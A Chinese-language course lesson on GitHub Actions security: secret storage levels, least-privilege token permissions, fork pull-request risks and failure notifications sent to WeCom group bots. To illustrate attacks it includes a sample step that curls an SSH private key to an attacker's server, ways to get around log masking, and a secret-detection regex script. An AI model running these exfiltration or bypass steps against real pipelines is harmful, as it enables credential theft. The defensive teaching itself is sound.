# 第 209 节课：密钥与失败通知——别让流水线悄悄死掉

> 第 208 节课你的流水线已经能自动上线了。它现在手上握着四个密钥、一个临时令牌、一台服务器的钥匙。
> 这节课做两件事：**把这些东西管住**，以及**在它坏掉的时候让手机响一下**。

**建议用时**：120 分钟
**你需要先完成**：第 208 节课（`deploy` job 跑通过，四个 secrets 已配好）

---

# 第 0 步：为什么要有这一步（10 分钟）

## 0.1 你现在会什么

**你现在有这些东西：**

```text
SSH_PRIVATE_KEY      能登服务器的私钥
SSH_HOST             服务器 IP
SSH_USER             登录用户名
SSH_KNOWN_HOSTS      服务器指纹
GITHUB_TOKEN         自动生成，能推镜像
```

**它们都放在 GitHub 的仓库设置里，你的 yml 里只写 `${{ secrets.XXX }}`。**

**这已经比"写在 yml 里"好很多了。但还不够。**

## 0.2 你以后会遇到什么

```text
① 你把 ci-lab 改成 Public（为了免费的分支保护），忘了某个 secret 曾经被 echo 到日志里
② 有个陌生人 fork 了你的仓库，开了一个 PR，PR 里的 workflow 跑起来，拿不到 secrets —— 你以为是 bug
③ 某个 workflow 挂了三天，你才发现，因为"没人告诉我"
④ 你为了省事给 GITHUB_TOKEN 开了 write-all，某天一个被投毒的 action 用它删了你的仓库
⑤ 客户问"你们的密钥怎么管的"，你说"存在 GitHub 里"，然后不知道怎么往下说
```

**这五个场景，靠"我记得小心一点"全都防不住。**

## 0.3 今天要建立的三个概念

```text
① 密钥的三种存法：repository secret / environment secret / 外部密钥服务
② 最小权限：GITHUB_TOKEN 只给"这次运行真正需要的那几项"
③ 失败通知：让"坏消息"主动找你，而不是你去翻页面
```

## 0.4 今天的交付物

| 文件 | 位置 | 内容 |
|---|---|---|
| `TASK.md` | `01-任务` | 你正在读的这份 |
| `NOTES.md` | `02-笔记` | 你的学习记录 |
| `permissions:` 收窄 | 三个 workflow 文件 | 每个只给它需要的权限 |
| `notify` job | `build.yml` | 失败时发一条到群机器人 |
| 一条真实的通知 | 你的手机/群里 | 必须收到过 |

**最后一条必须做到。** "配了通知"和"收到过通知"是两件事。

---

# 第 1 步：先搞清楚"泄露"是怎么发生的（20 分钟）

## 1.1 四种泄露路径

```text
① 直接写进 yml，然后 commit
② 写进 Dockerfile 或源码，打进镜像
③ 在 CI 里 echo 出来，留在 Actions 日志里
④ 放进 .env，然后 .env 被 commit
```

**四种里有三种是"进了 Git"，一种是"进了日志"。**

**它们的共同点：一旦发生，就**永久**存在。**

## 1.2 路径一：写进 yml

**你做一次，看看后果。**

**新建一个测试文件 `.github/workflows/leak-test.yml`：**

```yaml
name: leak-test

on:
  workflow_dispatch:

jobs:
  show:
    runs-on: ubuntu-latest
    steps:
      - run: echo "token 是 ghp_1234567890abcdefghijklmnopqrstuvwxyz"
```

**push，然后手动触发一次。**

**看日志：**

```text
Run echo "token 是 ghp_1234567890abcdefghijklmnopqrstuvwxyz"
  echo "token 是 ghp_1234567890abcdefghijklmnopqrstuvwxyz"
  shell: /usr/bin/bash -e {0}
token 是 ghp_1234567890abcdefghijklmnopqrstuvwxyz
```

**没有被遮住。**

**为什么：**

```text
GitHub 只遮"它认识的 secret 值"
这个字符串不是任何 secret 的值
它只是一个"看起来像 token"的普通字符串
```

**⚠️ 但如果你真的 push 了一个有效的 token，GitHub 会做两件事：**

```text
① 给你发邮件："GitHub personal access token detected"
② 有时会自动吊销那个 token（取决于类型）
```

**自动吊销不是保证。** 很多类型的密钥它不认识。

**现在删掉这个文件，再 push：**

```bash
git rm .github/workflows/leak-test.yml
git commit -m "删掉测试文件"
git push
```

**但密钥还在历史里：**

```bash
git log --all -p | grep -n "ghp_1234567890"
```

**应该看到：**

```text
1234:+      - run: echo "token 是 ghp_1234567890abcdefghijklmnopqrstuvwxyz"
```

**这就是关键：**

> **删文件不等于删历史。`git log` 里那一行会一直在，直到你重写整个历史。**

**重写历史（`git filter-repo`、BFG）能做到，但：**

```text
① 所有 fork 的仓库还留着旧历史
② 所有 clone 过的人本地还有
③ 已经泄露的时间不会倒流
```

**所以结论是：**

> **密钥泄露之后，唯一有效的动作是"吊销它"，不是"删掉它"。**

## 1.3 路径二：打进镜像

**你第 207 节课已经防住了这一条（`.dockerignore` 挡 `.env`）。**

**但还有一种更隐蔽的：**

```dockerfile
# ❌ 这行会把 key 写进镜像的"层历史"里
ENV MODEL_API_KEY=sk-xxxxx
```

**为什么隐蔽：**

```text
即使你下一层 ENV MODEL_API_KEY=""
镜像的层历史里仍然有第一层的值
docker history --no-trunc 能看到
```

**验证：**

```bash
docker history --no-trunc 你的镜像 | grep -i "api_key"
```

**有输出就说明泄露了。**

**正确做法：**

```dockerfile
# ✅ 运行时注入，不写进镜像
# 不在 Dockerfile 里出现任何密钥
```

**运行时注入：**

```yaml
# docker-compose.yml
    env_file:
      - .env
```

**`.env` 在服务器上，不进镜像。**

## 1.4 路径三：留在 Actions 日志里

**GitHub 会给 secret 的值打码。**

**验证一下（用你已有的 secret）：**

```yaml
      - run: echo "host = ${{ secrets.SSH_HOST }}"
```

**日志：**

```text
host = ***
```

**看起来安全。但下面这三种都能绕过：**

**绕过一：base64**

```yaml
      - run: echo "${{ secrets.SSH_HOST }}" | base64
```

**日志：**

```text
NDcuOTguMTIuMzQK
```

**没有 `***`。**

**为什么：**

```text
GitHub 的遮罩是"字符串精确匹配"
base64 之后是另一个字符串，它不认识
```

**绕过二：反转**

```yaml
      - run: echo "${{ secrets.SSH_HOST }}" | rev
```

**绕过三：拆开**

```yaml
      - run: echo "${A:0:5}${A:5}"
        env:
          A: ${{ secrets.SSH_HOST }}
```

**这三种都是"我在演示怎么泄露"，不是为了教你泄露。**

**它们的意义是：**

> **不要把 `***` 当成安全保障。它只是"防止手滑"，不是"防止故意"。**

**真正要防的是"手滑"。所以：**

```text
❌ 不要 printenv
❌ 不要 env | grep
❌ 不要 cat .env
❌ 不要 set -x（会把每条命令展开打印）
```

**`set -x` 这一条特别坑：**

```bash
set -x
curl -H "Authorization: Bearer $TOKEN" https://api.example.com
```

**日志里会出现：**

```text
+ curl -H 'Authorization: Bearer sk-真实密钥' https://api.example.com
```

**`set -x` 会把变量展开后打印。** 调试完一定要删。

## 1.5 路径四：`.env` 被 commit

**你从第 200 节课就在防这一条。**

**但每年还是有大量项目栽在这上面。原因：**

```text
① .gitignore 写错了文件名（.env.local vs .env）
② 用了 git add -f
③ 用了图形化工具，它"帮你"勾上了所有文件
④ .gitignore 是后来才加的，之前的提交已经包含了
```

**查一遍你的仓库：**

```bash
git log --all --full-history -- "*.env" "*.env.*"
```

**应该看到：空。**

**如果有输出，说明 `.env` 曾经被提交过。**

**再查一遍"当前所有被跟踪的文件里有没有可疑的"：**

```bash
git ls-files | grep -iE "\.env|secret|credential|\.pem|\.key"
```

**应该看到：**

```text
（空）
```

**如果有输出，逐个确认：**

```text
.env.example      ← 可以，它没有真值
config/keys.json  ← 要看内容
```

## 1.6 一道"上线前必跑"的检查

**把上面几条合成一个脚本，放进 `package.json`：**

```json
    "secrets:check": "node scripts/check-secrets.mjs"
```

**新建 `scripts/check-secrets.mjs`：**

```javascript
import { execFileSync } from 'node:child_process'

const patterns = [
  /ghp_[A-Za-z0-9]{36}/,
  /github_pat_[A-Za-z0-9_]{82}/,
  /sk-[A-Za-z0-9]{20,}/,
  /AKIA[0-9A-Z]{16}/,
  /-----BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY-----/,
]

const files = execFileSync('git', ['ls-files'], { encoding: 'utf8' })
  .split('\n')
  .filter(Boolean)

let hits = 0

for (const file of files) {
  let content
  try {
    content = execFileSync('git', ['show', `HEAD:${file}`], {
      encoding: 'utf8',
      maxBuffer: 10 * 1024 * 1024,
    })
  } catch {
    continue
  }

  for (const re of patterns) {
    if (re.test(content)) {
      console.log(`可疑: ${file} 匹配 ${re}`)
      hits += 1
    }
  }
}

if (hits > 0) {
  console.log(`\n发现 ${hits} 处可疑内容`)
  process.exit(1)
}

console.log(`检查了 ${files.length} 个文件，没有发现疑似密钥`)
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `patterns` | 五种常见密钥的正则 |
| `git ls-files` | 列出所有被跟踪的文件 |
| `git show HEAD:file` | 读这个文件在最新提交里的内容 |
| `maxBuffer` | 允许读大文件（默认只有 1MB） |
| `process.exit(1)` | 有发现就以失败退出 |

**跑一次：**

```bash
npm run secrets:check
```

**应该看到：**

```text
检查了 12 个文件，没有发现疑似密钥
```

**⚠️ 这个脚本有三个局限，你要知道：**

```text
① 它只查"最新提交"，不查历史
② 正则只能匹配"格式已知"的密钥
③ 它读不到 .env（.env 不在 Git 里，这是对的）
```

**但它能挡住 90% 的手滑。**

**把它加进 CI（`test` job 里加一步）：**

```yaml
      - name: 检查有没有密钥被提交
        run: npm run secrets:check
```

**这样你每次 push 都会被查一遍。**

**⚠️ 但注意：这一步会让"故意写测试密钥"变得不可能。** 如果你要测试这个脚本本身，用一个明显的假值并把它加进白名单。

---

# 第 2 步：Secrets 的三种级别（20 分钟）

## 2.1 仓库级（你现在用的）

```text
Settings → Secrets and variables → Actions → Repository secrets
```

**特点：**

```text
① 这个仓库的所有 workflow 都能用
② 所有分支都能用
③ 所有 job 都能用
```

**"所有分支都能用"是一个风险：**

```text
你开了一个 feature 分支，里面有个 workflow 要试"新的部署方式"
→ 它能拿到生产环境的 SSH_PRIVATE_KEY
→ 它可能把服务部署到生产
```

**对一个人做产品，这个风险不大。** 但要知道它的边界。

## 2.2 环境级（推荐给"生产"用）

**做法：**

**第一步，建环境：**

```text
Settings → Environments → New environment → 名字填 production
```

**第二步，在这个环境里加 secret：**

```text
production → Add secret → SSH_PRIVATE_KEY_PROD
```

**第三步，workflow 里声明用哪个环境：**

```yaml
  deploy:
    name: 部署到服务器
    needs: build
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: ssh ... "${{ secrets.SSH_PRIVATE_KEY_PROD }}"
```

**`environment: production` 做了三件事：**

| 作用 | 说明 |
|---|---|
| 只注入这个环境的 secrets | 同名的仓库级 secret 会被覆盖 |
| 记录"这个版本部署到了 production" | 仓库首页右侧的 `Deployments` 会显示 |
| 可以加保护规则 | 见下 |

**保护规则（`Environment protection rules`）：**

```text
Required reviewers      → 部署前必须有人点"批准"
Wait timer              → 等 N 分钟才允许部署
Deployment branches     → 只允许 main 分支部署
```

**`Required reviewers` 对你一个人有用吗：**

```text
有用。它强迫你"点一下"，而不是"push 就上线"
→ 那一秒的停顿，可能就让你发现"这是要上线到生产吗"
```

**`Deployment branches` 更实用：**

```text
只允许 main 部署
→ feature 分支的 workflow 即使拿到 secrets 也不能部署
```

**⚠️ 私有仓库的环境保护规则需要 GitHub Pro（和分支保护一样）。**

**你现在可以建环境、用环境 secret，但不一定能用保护规则。**

## 2.3 组织级（了解即可）

**如果你有多个仓库（客户 A、客户 B、自己的产品），可以把 secret 放在组织级别。**

```text
Organization → Settings → Secrets and variables → Actions
```

**然后选择"哪些仓库能用这个 secret"。**

**你现在只有一个仓库，用不上。** 但知道有这一层，以后扩展时不用重新设计。

## 2.4 三种级别的选择建议

| 场景 | 用哪种 |
|---|---|
| 学习、练手、只有一个环境 | 仓库级 |
| 有生产环境，想加一层确认 | 环境级 |
| 多个仓库共用同一个 API key | 组织级 |
| 密钥需要定期自动轮换 | 外部密钥服务（Vault、云厂商 KMS） |

**第四种你现在不需要。** 它的复杂度远超收益。

**但你需要知道"GitHub Secrets 不是最强的方案"：**

```text
它的问题是：一旦写进去，你无法"读出来"（这是对的）
但也无法"自动轮换"（这是缺点）
```

**第 225 节课会讲"泄露后的吊销流程"。** 那是唯一的补救手段，所以必须练一遍。

## 2.5 一个必须做的动作：给 secrets 编号

**你的仓库现在有 4 个 secret。半年后会有 15 个。**

**你会忘记"这个 `TOKEN_V2` 是干什么的"。**

**做法：在仓库里建一个 `SECRETS.md`（不含任何真值）：**

```markdown
# 本仓库的 Secrets 清单

| 名字 | 用途 | 谁生成 | 什么时候该轮换 |
|---|---|---|---|
| `SSH_PRIVATE_KEY` | CI 登服务器执行部署 | `ssh-keygen` | 每年，或怀疑泄露时 |
| `SSH_HOST` | 服务器 IP | 云控制台 | 换服务器时 |
| `SSH_USER` | 部署用户名 | 手动建 | 不做 |
| `SSH_KNOWN_HOSTS` | 服务器指纹 | `ssh-keyscan` | 服务器重装时 |
| `WECOM_WEBHOOK` | 失败通知群机器人 | 企业微信 | 泄露时立即 |
```

**为什么这个文件有价值：**

```text
① 一年后你知道"哪个能删"
② 泄露时你知道"去哪个平台重新生成"
③ 交接给别人时，他知道要配哪几个
```

**⚠️ 这个文件里绝对不能有真值。** 只写"名字"和"用途"。

**第 224 节课（运维清单）会把这张表并进去。**

---

# 第 3 步：`GITHUB_TOKEN` 与最小权限（25 分钟）

## 3.1 `GITHUB_TOKEN` 是什么

**每次 workflow 运行，GitHub 自动生成一个临时令牌。**

```text
名字：GITHUB_TOKEN（也写作 secrets.GITHUB_TOKEN）
有效期：这次运行结束就失效（最长 24 小时）
归属：一个"GitHub Actions 机器人"账号
```

**它的好处：**

```text
① 不用你手动创建
② 不用你手动轮换（每次都是新的）
③ 权限可以被精确控制
```

**这三个加起来，让它成为"CI 里最该用的凭证"。**

## 3.2 默认权限是什么

**取决于仓库设置：**

```text
Settings → Actions → General → Workflow permissions

○ Read and write permissions
● Read repository contents and packages permissions
```

**新仓库的默认是第二个（更严格）。老仓库可能是第一个。**

**这就是为什么"抄了别人的 yml 但推不了镜像"—— 他的仓库设置是 read-write，你的不是。**

**所以：显式写 `permissions:`。**

## 3.3 权限清单（常用的八个）

| 权限 | 控制什么 | 典型用途 |
|---|---|---|
| `contents` | 读/写仓库文件 | `checkout` 要 `read`；打 tag 要 `write` |
| `packages` | 读/写 GitHub Packages | 推镜像要 `write` |
| `actions` | 读/写 workflow 运行记录 | 取消别人的运行要 `write` |
| `checks` | 写检查结果 | 一般不用手动给 |
| `deployments` | 写部署记录 | 用了 `environment` 时需要 |
| `issues` | 读写 issue | 自动建 issue |
| `pull-requests` | 读写 PR | 自动评论 PR |
| `id-token` | 用 OIDC 换云厂商凭证 | 部署到 AWS/阿里云 |

**每个权限的值只能是：**

```text
read
write
none
```

## 3.4 给三个 workflow 分别收窄

**原则：**

```text
check.yml   → 只需要 contents: read
test.yml    → 只需要 contents: read
build.yml   → 需要 contents: read + packages: write
```

**`check.yml` 和 `test.yml` 加上：**

```yaml
permissions:
  contents: read
```

**`build.yml`（现在包含 deploy）：**

```yaml
permissions:
  contents: read
  packages: write
```

**⚠️ 一个陷阱：`deploy` job 在 `build.yml` 里，它继承了 `packages: write`。**

**但 deploy 不需要推镜像，它只需要 SSH。**

**更细的做法是"job 级 permissions"：**

```yaml
  build:
    permissions:
      contents: read
      packages: write

  deploy:
    permissions:
      contents: read
```

**job 级的 `permissions` 会覆盖 workflow 级的。**

**这是真正的"最小权限"—— 每个 job 只给它需要的。**

**但要注意：job 级写了 permissions，其余全部变 `none`。**

**deploy job 里不需要 `packages`，但它也不需要别的。所以 `contents: read` 够。**

**⚠️ 实际上 deploy job 连 `contents: read` 都不需要（它不 checkout）。**

**但写了也没坏处，而且以后要 checkout 就不用改。**

## 3.5 一个反例：`write-all`

**你可能会看到这种写法：**

```yaml
permissions: write-all
```

**它的意思是"所有权限都给写"。**

**为什么危险：**

```text
① 如果一个 action 被投毒，它能：
   - 删你的仓库（contents: write）
   - 覆盖你的镜像（packages: write）
   - 改你的 workflow（contents: write，直接改 .github 下的文件）
   - 删你的 release
② 你失去了"这次运行到底该干什么"的可审计性
```

**真实案例（2025 年发生过多次）：**

```text
某个流行的 action 仓库被入侵
攻击者加了一行"把 GITHUB_TOKEN 发到我服务器"
所有用 write-all 的项目，token 立刻泄露
```

**怎么防：**

```text
① 不用 write-all
② 固定 action 的版本（用 @v4 而不是 @main）
③ 对来源不明的 action，看它的源码
```

**第 ② 条很重要：**

```yaml
- uses: actions/checkout@v4        ✅ 大版本固定
- uses: actions/checkout@main      ❌ 每次拉最新，作者改了你就中招
- uses: actions/checkout@8f4b7f8   ✅ 最严格，固定到 commit
```

**固定到 commit 最安全，但升级麻烦。** 你现在用 `@v4` 就够。

## 3.6 用 `gh` 查看当前的权限设置

**如果你装了 GitHub CLI：**

```bash
gh api repos/你的用户名/ci-lab/actions/permissions/workflow
```

**应该看到：**

```json
{
  "default_workflow_permissions": "read",
  "can_approve_pull_request_reviews": false
}
```

**`default_workflow_permissions: read` 说明默认是只读。**

**这个数会随仓库设置变。** 所以显式写 `permissions:` 才是最稳的。

**没装 `gh` 也没关系，去网页上看：**

```text
Settings → Actions → General → Workflow permissions
```

---

# 第 4 步：fork 的 PR 为什么拿不到 secrets（20 分钟）

## 4.1 先看清现象

**你的 `build.yml` 触发条件是 push 到 main。所以 fork 的 PR 不会触发它。**

**但如果有人给 `test.yml` 加 `pull_request`（你已经加了），然后 fork 一个 PR：**

**在 fork 的 PR 里，这个 workflow 会跑，但：**

```text
secrets        → 全部是空字符串
GITHUB_TOKEN   → 只读，不能推 packages
```

**空字符串会怎么表现：**

**假设有个 step：**

```yaml
      - run: docker login ghcr.io -u ${{ github.actor }} -p ${{ secrets.GHCR_TOKEN }}
```

**日志：**

```text
Error: Cannot perform an interactive login from a non TTY device
```

**或者：**

```text
Error: Username and password required
```

**为什么报错信息不一样：**

```text
-p "" → docker 认为你没给密码 → 尝试交互式输入 → 没有终端 → 报第一种
或者它检查参数为空 → 报第二种
```

**取决于 docker 版本。** 你只要知道"空 secret 会导致登录失败"就够了。

## 4.2 为什么这是安全设计

**假设 fork 的 PR 能拿到 secrets。**

**攻击者只需要三步：**

```text
① fork 你的仓库
② 改 .github/workflows/test.yml：
     - run: curl -X POST https://他的服务器/collect -d "${{ secrets.SSH_PRIVATE_KEY }}"
③ 开一个 PR
```

**你的 CI 会跑，会把私钥 POST 出去。**

**他甚至不需要你合并。** 只要 workflow 在 PR 上跑（`pull_request` 触发），就执行了。

**这就是"pwn request"攻击。** 2021 年以来发生过很多次，包括一些知名开源项目。

## 4.3 三层防护

**第一层：GitHub 强制（你控制不了）**

```text
fork PR：
  secrets        → 空
  GITHUB_TOKEN   → 只读
```

**第二层：用 `pull_request_target` 时要极其小心**

**`pull_request_target` 是另一个触发事件，它在"目标仓库的上下文"里跑，**能拿到 secrets**。**

```yaml
on:
  pull_request_target:
```

**为什么它存在：**

```text
有些操作（比如给 PR 打标签、留评论）需要写权限
pull_request 给不了
所以有了 pull_request_target
```

**为什么它危险：**

```yaml
on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← 这两行
      - run: npm install                                   # ← 这三行 = 灾难
      - run: npm test
```

**问题：**

```text
① pull_request_target 有 secrets 和写权限
② 你 checkout 了"PR 作者的代码"
③ 你执行了它（npm install 会跑 postinstall 脚本）
→ 作者的代码在你的 secrets 环境里执行了
```

**这就是"给了钥匙，还让陌生人进屋"。**

**正确用法（如果你真要用 `pull_request_target`）：**

```text
① 不要 checkout PR 的代码
② 只做"读 PR 元数据"的事（打标签、留评论）
③ 任何"执行代码"的事都不能做
```

**第三层：你自己的判断**

```yaml
      - name: 只在非 fork 的 PR 上做需要密钥的事
        if: github.event.pull_request.head.repo.fork == false
        run: ...
```

**`github.event.pull_request.head.repo.fork` 是什么：**

```text
true  → 来自 fork
false → 来自本仓库的分支
```

**但这个条件只在 `pull_request` 事件里有值。**

**在 `push` 事件里它是空，所以 `== false` 会不成立。**

**更通用的写法：**

```yaml
      - name: 需要密钥的步骤
        if: github.event_name == 'push' || github.event.pull_request.head.repo.fork == false
```

## 4.4 一个实际建议

**你一个人做产品，**不要接受 fork 的 PR**。**

**为什么：**

```text
① 你会忍不住想看
② 看了就要跑 CI
③ 跑了就有风险（哪怕是只读 token，也可能被用来做别的事）
```

**如果真有人给你提 PR：**

```text
① 先看 diff，不要跑 CI
② 觉得有价值，把代码手动复制到你自己的分支
③ 在你自己的分支上跑 CI
```

**这听起来很保守。** 但你没有安全团队，保守是对的。

---

# 第 5 步：失败通知（30 分钟）

## 5.1 为什么"页面上的红勾"不够

**你的流水线现在挂了，谁会知道：**

```text
① 你 —— 如果你当天打开 Actions 页面
② 没人 —— 如果没有别的机制
```

**真实情况是：**

```text
你 push 完就去干别的了
三天后想起来"哦我那天推了个东西"
打开一看，红了三天，网站还是旧版本
```

**这就是"流水线悄悄死掉"。**

**它比"流水线报错"更糟，因为报错至少你知道了。**

## 5.2 第一层：GitHub 自带邮件

**默认行为：**

```text
你 push 触发的 workflow 失败了
→ GitHub 给你的注册邮箱发一封邮件
→ 主题类似 "[你的用户名/ci-lab] Run failed: build - main (3f7a1c2)"
```

**为什么你可能收不到：**

```text
① Settings → Notifications 里关掉了 Actions 邮件
② 邮件进了垃圾箱
③ 你不是"触发者"（比如是定时任务触发的）
④ 你的邮箱没验证
```

**检查：**

```text
右上角头像 → Settings → Notifications → Email notification preferences
→ 勾选 "Actions" 相关的项
```

**优点：** 零配置。

**缺点：**

```text
① 容易进垃圾箱
② 手机上不一定推送
③ 只有"触发者"收到（团队协作时别人收不到）
④ 邮件太多你会开始无视
```

**所以需要第二层。**

## 5.3 第二层：群机器人

**企业微信 / 钉钉 / 飞书都支持"群机器人 webhook"。**

**原理：**

```text
你在群里加一个机器人
它给你一个 URL
你往这个 URL POST 一段 JSON
群里就出现一条消息
```

**优点：**

```text
① 手机有推送
② 群里其他人也能看到（如果你有合伙人/客户对接人）
③ 可以 @ 人
```

**缺点：**

```text
① webhook URL 本身就是一个密钥（拿到它就能往你群里发消息）
② 平台的接口格式各不相同
③ 免费版有频率限制
```

## 5.4 建一个企业微信群机器人

**操作（企业微信客户端）：**

1. 打开一个群（可以自己建一个只有自己的群）；
2. 右上角 `...` → `群机器人` → `添加机器人`；
3. 名字填 `CI 通知`；
4. 点 `添加`；
5. **复制那个 webhook 地址。**

**地址长这样：**

```text
https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**⚠️ 这个 URL 里的 `key` 就是凭证。**

```text
任何人拿到它，都能往你的群里发任意消息
所以它必须放进 Secrets，不能写进 yml
```

**存进 secret：**

| 名字 | 值 |
|---|---|
| `WECOM_WEBHOOK` | 那一整条 URL |

**如果用的是飞书：**

| 名字 | 值 |
|---|---|
| `FEISHU_WEBHOOK` | `https://open.feishu.cn/open-apis/bot/v2/hook/xxxx` |

**钉钉的额外要求（容易踩坑）：**

```text
钉钉机器人默认要求消息里包含"关键词"（你在建机器人时设的）
或者要求"加签"（secret + 时间戳算 HMAC）
不加就会被拒：{"errcode":310000,"errmsg":"sign not match"}
```

**所以钉钉比企业微信/飞书麻烦。** 你现在选企业微信或飞书就行。

## 5.5 写 `notify` job

**加到 `build.yml` 最后：**

```yaml
  notify:
    name: 失败通知
    needs:
      - test
      - build
      - deploy
    if: failure()
    runs-on: ubuntu-latest
    timeout-minutes: 5

    steps:
      - name: 发到企业微信
        env:
          WEBHOOK: ${{ secrets.WECOM_WEBHOOK }}
          REPO: ${{ github.repository }}
          SHA: ${{ github.sha }}
          ACTOR: ${{ github.actor }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          TEXT="流水线失败
          仓库: ${REPO}
          提交: ${SHA:0:7}
          触发人: ${ACTOR}
          查看: ${RUN_URL}"

          curl -sS -X POST "$WEBHOOK" \
            -H 'Content-Type: application/json' \
            -d "$(node -e 'console.log(JSON.stringify({msgtype:"text",text:{content:process.argv[1]}}))' "$TEXT")"
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `needs: [test, build, deploy]` | 三个都跑完（不管成败）才轮到它 |
| `if: failure()` | **只有"前面有 job 失败"时才跑** |
| `env:` | 把 GitHub 的上下文转成环境变量 |
| `SHA:0:7` | 取前 7 位（bash 语法） |
| `curl -sS -X POST` | 静默但显示错误，POST 方法 |
| `-H 'Content-Type: application/json'` | 告诉服务器"我发的是 JSON" |
| `-d` | 请求体 |
| `node -e '...'` | 用 Node 生成合法 JSON（避免手动转义换行） |

**为什么用 Node 生成 JSON 而不用 `cat <<EOF`：**

```text
TEXT 里有换行符
手写 JSON 时换行必须转义成 \n
拼接字符串极易出错

用 JSON.stringify 自动处理所有转义
```

**为什么用 `process.argv[1]` 而不是插值：**

```bash
-d "$(node -e '...' "$TEXT")"
```

**`"$TEXT"` 作为参数传给 node，在 `process.argv[1]` 里拿到。**

**如果直接在 JS 字符串里插值，文本里有引号或反引号就会破坏脚本。**

**这是"命令行参数 vs 字符串拼接"的经典区别。** 第 228 节课会讲注入，你现在先记住这个模式。

## 5.6 `if: failure()` 的三个细节

**细节一：job 级的 `if: failure()` 需要 `needs`。**

```yaml
  notify:
    needs: [build]
    if: failure()
```

**如果没有 `needs`：**

```text
notify 会和 build 同时开始
那时候还没失败
→ failure() 是 false
→ notify 被跳过
```

**这是最常见的坑：** 忘了写 `needs`，通知永远不发。

**细节二：`failure()` 的判断范围是"needs 里的那些 job"。**

```text
needs: [test, build, deploy]
→ 这三个里任何一个失败，failure() 为 true
```

**如果失败的是"没有被 needs 引用"的 job：**

```text
那个 job 的失败不会触发这个 notify
```

**细节三：`if: failure()` 在 step 级和在 job 级不一样。**

**job 级：**

```yaml
  notify:
    if: failure()
```

**step 级：**

```yaml
    steps:
      - run: echo "发通知"
        if: failure()
```

**step 级的 `failure()` 判断的是"这个 job 里前面的 step 有没有失败"。**

**两者混用会很混乱。** 建议：**通知用一个独立的 job，用 job 级 `if: failure()`。**

## 5.7 让通知同时覆盖"成功"

**有时候你也想知道"部署成功了"。**

**改成：**

```yaml
  notify:
    name: 通知
    needs: [test, build, deploy]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: 判断结果并发送
        env:
          WEBHOOK: ${{ secrets.WECOM_WEBHOOK }}
          RESULT: ${{ contains(needs.*.result, 'failure') && '失败' || '成功' }}
        run: |
          echo "结果: $RESULT"
          ...
```

**`needs.*.result` 是什么：**

```text
一个数组，包含所有 needs 里 job 的结果
值是 success / failure / cancelled / skipped
```

**`contains(needs.*.result, 'failure')` 是什么：**

```text
数组里有没有 'failure'
```

**`&& '失败' || '成功'` 是什么：**

```text
GitHub 表达式里的"三元运算"
前面为真取 '失败'，否则取 '成功'
```

**⚠️ 这个写法有一个坑：**

```text
如果结果是 'cancelled'（你手动取消了），它会显示"成功"
因为它只检查 'failure'
```

**更严谨的写法：**

```yaml
          RESULT: ${{ contains(needs.*.result, 'failure') && '失败' || (contains(needs.*.result, 'cancelled') && '已取消' || '成功') }}
```

**这就开始难读了。**

**我的建议：**

```text
成功不发，失败才发。
因为"成功"你不需要知道，"失败"你必须知道。
```

**少发消息 = 每条消息都被认真看。**

**这是一个反直觉但重要的原则：**

> **通知的价值 = 消息数量 × 每条消息被重视的程度。消息太多，这个乘积会归零。**

## 5.8 测试通知

**故意让 test 失败：**

```javascript
test('故意失败', () => {
  assert.strictEqual(1, 2)
})
```

```bash
git add .
git commit -m "故意让测试失败，验证通知"
git push
```

**等 1 分钟。**

**你的手机/群里应该出现：**

```text
流水线失败
仓库: 你的用户名/ci-lab
提交: 3f7a1c2
触发人: 你的用户名
查看: https://github.com/你的用户名/ci-lab/actions/runs/12345678
```

**点那个链接，应该直接到这次运行。**

**如果没收到，按这个顺序查：**

```text
① notify job 跑了吗（Actions 页面上有没有这个 job）
② 如果 skipped → if / needs 写错了
③ 如果跑了但失败了 → 看 curl 的输出
④ 如果 curl 成功但没消息 → webhook URL 错了 / 机器人被移出群了
```

**`curl` 的返回很关键：**

**企业微信成功时返回：**

```json
{"errcode":0,"errmsg":"ok"}
```

**失败时：**

```json
{"errcode":93000,"errmsg":"invalid webhook url, hint: ..."}
```

**或者：**

```json
{"errcode":45009,"errmsg":"api freq out of limit"}
```

**所以 curl 要加 `-sS` 并把响应打印出来：**

```bash
RESP=$(curl -sS -X POST "$WEBHOOK" -H 'Content-Type: application/json' -d "$BODY")
echo "响应: $RESP"
echo "$RESP" | grep -q '"errcode":0' || { echo "发送失败"; exit 1; }
```

**最后一行很重要：**

```text
不加的话，企业微信返回 {"errcode":93000} 时 curl 的退出码仍是 0
→ notify job 显示绿
→ 你以为通知发出去了，其实没有
```

**这就是第 205 节课讲的"退出码"再次出现。**

---

# 第 6 步：故意犯八个错（25 分钟）

## 错误 1：secret 名字拼错

**操作：** 把 `secrets.WECOM_WEBHOOK` 写成 `secrets.WECOM_WEBHOOKS`（多一个 s）。

**会怎样：**

**不会报"secret 不存在"。**

**它会得到空字符串：**

```text
+ curl -sS -X POST '' -H 'Content-Type: application/json' -d '...'
curl: (3) URL using bad/illegal format or missing URL
Error: Process completed with exit code 3.
```

**逐行读：**

| 行 | 意思 |
|---|---|
| `-X POST ''` | URL 是空的 |
| `curl: (3)` | curl 的错误码 3 = URL 格式错误 |
| `missing URL` | 没有 URL |

**为什么 GitHub 不报错：**

```text
`${{ secrets.XXX }}` 的语义是"取这个 secret 的值"
取不到 → 空字符串
它不区分"不存在"和"值为空"
```

**这是 GitHub Actions 最坑的设计之一。**

**怎么防：在脚本开头检查。**

```yaml
        run: |
          if [ -z "$WEBHOOK" ]; then
            echo "WECOM_WEBHOOK 为空，检查 secret 名字"
            exit 1
          fi
          curl ...
```

**`-z` 是什么：** 字符串长度为 0 时返回真。

**配套的 `-n`：** 字符串长度不为 0 时返回真。**两个都常用。**

**更好的做法：在 job 开头统一检查所有必需的 secret。**

```yaml
      - name: 检查必需的环境变量
        run: |
          for name in WEBHOOK REPO SHA; do
            eval "value=\$$name"
            if [ -z "$value" ]; then
              echo "缺少 $name"
              exit 1
            fi
          done
```

**`eval "value=\$$name"` 是什么：**

```text
